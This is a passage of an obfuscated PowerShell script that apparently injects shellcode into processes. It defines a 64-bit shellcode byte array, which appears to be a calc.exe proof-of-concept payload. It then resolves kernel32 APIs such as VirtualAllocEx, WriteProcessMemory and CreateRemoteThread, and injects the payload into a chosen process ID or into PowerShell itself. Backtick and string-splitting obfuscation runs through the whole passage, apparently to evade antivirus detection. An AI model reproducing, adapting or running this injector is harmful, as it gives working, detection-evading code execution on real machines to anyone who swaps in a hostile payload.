        [Byte[]] ${s`HELL`CoDe`64}   =  @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
                                  0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
                                  0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                                  0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,
                                  0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
                                  0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,
                                  0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,
                                  0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
                                  0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
                                  0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,
                                  0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,
                                  0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
                                  0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,
                                  0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,
                                  0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                                  0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,
                                  0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00 )
    }

    if ( ${PsbOU`N`DPAram`ETE`RS}[( 'Pro' + 'cess'  +  'ID'  )]   )
    {
        
        ${opEnpr`O`C`EsSADDr}  =  GeT-PR`ocAD`DRe`sS KeRNEL32.Dll openPRoceSs
        ${oPE`NProce`sS`d`ELe`GAtE}   = g`eT-`dE`LeGA`TETYpE @([UInt32], [Bool], [UInt32]  ) (  [IntPtr])
        ${oPEn`pR`oCESs}   =   [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${OpEnPRo`C`ESSaD`DR}, ${OPe`NPROc`essdE`l`eGate}  )
        ${viRtU`AL`ALl`O`cexA`d`DR} = get-P`Ro`C`ADdr`eSS KeRnEL32.dlL virtuALallOCEX
        ${VI`Rtu`ALaLLOCE`xDE`LeGaTe}   =   Get-DEL`eg`A`TEtyPE @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]  ) ( [IntPtr] )
        ${Vi`R`TUa`laLloCeX} =   [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer( ${VIRtuAlAlloC`E`x`ADdR}, ${VIrT`U`A`LALlo`CeXdE`LegatE} )
        ${WRIT`eP`Roc`Ess`mEm`oryaD`DR}   =  gE`T-`prO`CaD`DReSS KeRNel32.DLL wRiTEProceSSmemOrY
        ${W`R`iTEpRO`c`ESs`mE`moRYde`LeGate}  = geT-Dele`GA`T`eTyPE @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType(   )) (  [Bool]  )
        ${wrIT`EP`RocEs`sM`EmORY}   =  [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer( ${wrI`TepR`OCes`S`Me`MOryaDdr}, ${WrIT`e`ProcEssMe`m`orYDelegA`TE})
        ${c`REateREMOtE`Thr`e`ADaDdr} =   Ge`T-PrO`c`AddresS keRNEl32.DLl CreaTErEmotethREaD
        ${C`REaT`ere`MotEThr`eAdDele`g`A`TE} =  GET`-`dEl`egaTeT`YpE @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr] ) (  [IntPtr])
        ${crEater`EmO`T`eT`HrEad} =  [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${c`R`eaTERemo`Tet`HR`eaDaD`Dr}, ${crEAtER`E`MO`T`E`ThreADDE`l`EgatE})
        ${CLO`SEHAN`DL`eADDr}   = GeT`-prOCAd`DRESS KErnel32.DLL CloSehandLE
        ${CL`oseHan`dlEde`L`E`GA`TE}   =  gEt-De`le`Ga`T`ET`yPE @([IntPtr] ) ([Bool])
        ${CLOSeHA`N`D`LE} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer( ${CLOse`H`And`LEaddr}, ${clOSeh`And`L`EDeleGATe})
    
        writ`e-`VE`Rb`OsE ('Inje'+'ct'  + 'ing ' + 'shel'  + 'l' +  'code '  +'i'  + 'nto ' +  'PID:'  + ' '  + "$ProcessId" )
        
        if (   ${for`Ce} -or ${p`S`cMDlET}.ShouldContinue(  (  'Do ' +  'you wi'+ 's' +'h'+  ' '+'t'  +  'o carr'+'y out your evil pl'+'ans?'  ),
                 "Injecting shellcode injecting into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)! "   )  )
        {
            I`NJEc`T`-rEmoT`EShEl`lCODE ${pR`OCe`SsiD}
        }
    }
    else
    {
        
        ${v`irTUaLa`l`loc`AddR} = GE`T-`PROCa`DD`ResS KErneL32.DlL VirTuALaLLoC
        ${ViRT`U`ALAl`locDEleg`AtE}   = gET`-D`ELEgAteTyPE @([IntPtr], [UInt32], [UInt32], [UInt32] ) ([IntPtr] )
        ${V`IrTuALaLL`Oc}   =  [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${vIRTuAl`A`LlO`c`Ad`DR}, ${vI`R`T`UaLALLoc`deleG`ATE})
        ${vIR`TU`AlFre`EADDr}  =   g`et`-pRocADdr`e`ss KERNEL32.Dll vIrtuaLFRee
        ${vIrtu`AlF`Reede`l`egAte}   = gE`T-dELEG`AT`ET`YPE @([IntPtr], [Uint32], [UInt32]  ) ( [Bool])
        ${viRTUAL`FR`EE}   =   [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${vIr`Tu`ALf`REEadDR}, ${VIr`Tual`Fr`EedeLEGaTE}  )
        ${crE`A`TE`THR`EadA`Ddr}  = geT`-PRoCaddr`e`Ss kerNEL32.dll CREAtETHREAd
        ${C`REAt`eTHR`eaDDEL`EG`AtE}   =   get-dEL`e`g`AtetYPE @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) (  [IntPtr] )
        ${cRea`TetHre`AD}  =   [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${CrEAtet`hR`Ead`ADDR}, ${CReatE`THREadde`LE`G`A`Te} )
        ${waItfOrsIn`gleo`B`JeCtAD`dr}  = Ge`T`-`pROcaDDRESS KErnel32.dLl WAItfoRsINgLeObject
        ${waitFO`R`singLEoBjectDel`E`g`A`Te} =   get-d`El`egaT`EtYPE @([IntPtr], [Int32] ) ( [Int]  )
        ${waI`T`F`orsInGL`EOb`JEct}  =  [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${WAITFo`RSIN`GLEobJEc`Ta`ddr}, ${WaiTF`or`SINGle`ob`Je`ctdELeGATe} )
        
        w`R`I`Te-verbOSe ( 'Inj'  + 'ecting '  +'s' + 'h'+ 'el' + 'lc'  +'ode into '  + 'P'  +  'ow'+  'er'  +  'Shell' )
        
        if ( ${F`O`RCE} -or ${Ps`c`mDLet}.ShouldContinue(  (  'Do' + ' you wish '  +  't'  +  'o'+  ' carry o'  +'ut yo'  + 'ur evi' +  'l plans?' ),
                 ( 'Injec' + 't'+ 'ing sh' +'ell' +'code int'+  'o the running Po'  + 'we' +  'rS'+'hel'  +  'l' + ' ' +'process' +  '!' )  )  )
        {
            injeCt-LOC`AlSHe`Ll`co`de
        }
    }   
}
